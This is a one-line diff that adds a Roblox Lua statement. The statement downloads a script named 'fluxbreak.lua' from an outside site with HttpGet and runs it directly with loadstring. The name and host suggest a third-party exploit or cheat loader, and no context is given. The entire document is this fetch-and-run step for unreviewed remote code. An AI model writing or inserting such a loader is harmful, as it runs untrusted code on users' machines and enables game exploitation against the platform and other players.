@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://fluxteam.xyz/scripts/fluxbreak/fluxbreak.lua"), true))()
